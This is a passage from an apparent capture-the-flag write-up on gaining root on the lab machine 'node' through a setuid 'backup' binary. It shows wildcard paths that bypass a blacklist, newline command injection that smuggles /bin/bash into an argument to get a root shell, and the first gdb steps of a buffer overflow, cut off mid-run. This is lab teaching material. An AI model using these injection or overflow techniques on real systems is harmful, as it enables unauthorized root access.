  inflating: root/.viminfo
   creating: root/.nano/
 extracting: root/.nano/search_history
root@kali:~/node# cd root/
root@kali:~/node/root# ls -l
total 4
-rw-r----- 1 root root 33 Sep  3  2017 root.txt
root@kali:~/node/root# cat root.txt
1722e99ca5f353b362556a62bd5e6be0
root@kali:~/node/root#
```

###### Method 2 - Wildcards to bypass blacklist

```sh
root@kali:~/node/root# ls /r??t
blackmarket  Desktop  Documents  Downloads  homeless  Music  node  Pictures  Public  Templates  Videos
root@kali:~/node/root#
```

```sh
tom-4.3$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r??t/roo?.txt
UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWa2hFVt1eAsAAQQAAAAABAAAAAA+BF+hXfbfiFrGymOPD1yD7TDdLG6tko5nZXFnsHizcy+JiGEYq5FbPXm9rrhQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA
tom-4.3$
```

```sh
root@kali:~/node# nano root-flag.b64
root@kali:~/node# base64 -d root-flag.b64 > root-flag.zip
root@kali:~/node# unzip root-flag.zip
Archive:  root-flag.zip
[root-flag.zip] root/root.txt password:
 extracting: root/root.txt
root@kali:~/node# cd root/
root@kali:~/node/root# cat root.txt
1722e99ca5f353b362556a62bd5e6be0
root@kali:~/node/root#
```

###### Method 3 - Command injection via new line

![](images/32.png)

```sh
tom-4.3$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "asd
> /bin/bash
> asd"
	zip warning: name not matched: asd

zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_1145315709 . -i asd)
root@node:/# id
uid=0(root) gid=1001(mark) groups=1001(mark)
root@node:/#
root@node:/# cat root/root.txt
1722e99ca5f353b362556a62bd5e6be0
root@node:/#
```

```sh
tom-4.3$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'aaa\n/bin/sh\nasd')"
	zip warning: name not matched: aaa

zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_671388924 . -i aaa)
# id
uid=0(root) gid=1001(mark) groups=1001(mark)
#
```

###### Method 4 - Buffer Overflow

- Prerequisites
	- Three arguments
	- Do not use quiet mode `-q`
	- Valid token
	- BOF in third argument - `516` bytes

![](images/33.png)

```sh
➜  ~ python -c "print 'A'*520"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
➜  ~
➜  ~ python -c "print 'A'*510"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
➜  ~
➜  ~ python -c "print 'A'*516"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
➜  ~
```

```sh
root@kali:~/node# gdb ./backup -q
Reading symbols from ./backup...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ r aa 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /root/node/backup aa 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x22b
EBX: 0xffffd3e0 --> 0x4
ECX: 0x1
EDX: 0xf7fa8890 --> 0x0
ESI: 0xf7fa7000 --> 0x1d4d6c
EDI: 0xffffd32f --> 0x796500 ('')
EBP: 0x41414141 ('AAAA')
ESP: 0xffffc300 ("AAAA")
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffc300 ("AAAA")
0004| 0xffffc304 --> 0x8049e00 ("V6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==")
0008| 0xffffc308 --> 0x804d570 --> 0xfbad2498
0012| 0xffffc30c --> 0x8048a1b (<main+30>:	sub    esp,0xc)
0016| 0xffffc310 --> 0x0
0020| 0xffffc314 --> 0x0
0024| 0xffffc318 --> 0x0
0028| 0xffffc31c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ r aa 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /root/node/backup aa 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xff003a54
EBX: 0xffffd620 ('A' <repeats 200 times>...)
ECX: 0xffffd616 ('A' <repeats 200 times>...)
EDX: 0xff003a54
ESI: 0xf7fa7000 --> 0x1d4d6c
EDI: 0xff003a54
EBP: 0xff004141
ESP: 0xffffc304 --> 0xffffd3f0 --> 0x4
EIP: 0xf7e602e9 (movdqu XMMWORD PTR [edx],xmm1)
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e602de:	and    ebx,0xfffffff0
   0xf7e602e1:	pxor   xmm0,xmm0
   0xf7e602e5:	movdqu xmm1,XMMWORD PTR [ecx]
=> 0xf7e602e9:	movdqu XMMWORD PTR [edx],xmm1
   0xf7e602ed:	pcmpeqb xmm0,XMMWORD PTR [ebx]
   0xf7e602f1:	pmovmskb eax,xmm0
   0xf7e602f5:	sub    ebx,ecx
   0xf7e602f7:	test   eax,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffc304 --> 0xffffd3f0 --> 0x4
0004| 0xffffc308 --> 0xffffd33f --> 0x796500 ('')
0008| 0xffffc30c --> 0x804916e (<main+1905>:	add    esp,0x10)
0012| 0xffffc310 --> 0xff003a54
0016| 0xffffc314 --> 0xffffd616 ('A' <repeats 200 times>...)
0020| 0xffffc318 --> 0x804d570 --> 0xfbad2498
0024| 0xffffc31c --> 0x8048a1b (<main+30>:	sub    esp,0xc)
0028| 0xffffc320 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xf7e602e9 in ?? () from /lib32/libc.so.6
gdb-peda$ r aa 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /root/node/backup aa 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x227
EBX: 0xffffd3e0 --> 0x4
ECX: 0x1
EDX: 0xf7fa8890 --> 0x0
ESI: 0xf7fa7000 --> 0x1d4d6c
EDI: 0xffffd32f --> 0x796500 ('')
EBP: 0x41414141 ('AAAA')
ESP: 0xffffc300 --> 0xffffd600 ("d0230167104d474")
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffc300 --> 0xffffd600 ("d0230167104d474")
0004| 0xffffc304 --> 0x8049ed0 ("/etc")
0008| 0xffffc308 --> 0x804d570 --> 0xfbad2498
0012| 0xffffc30c --> 0x8048a1b (<main+30>:	sub    esp,0xc)
0016| 0xffffc310 --> 0x0
0020| 0xffffc314 --> 0x0
0024| 0xffffc318 --> 0x0
0028| 0xffffc31c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
```

```sh
➜  ~ python -c "print 'A'*512 + 'B'*4"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
➜  ~
```

```sh
root@kali:~/node# gdb ./backup -q
Reading symbols from ./backup...(no debugging symbols found)...done.
gdb-peda$ r aa 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Starting program: /root/node/backup aa 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x227
EBX: 0xffffd3e0 --> 0x4
ECX: 0x1
EDX: 0xf7fa8890 --> 0x0
ESI: 0xf7fa7000 --> 0x1d4d6c
EDI: 0xffffd32f --> 0x796500 ('')
EBP: 0x41414141 ('AAAA')
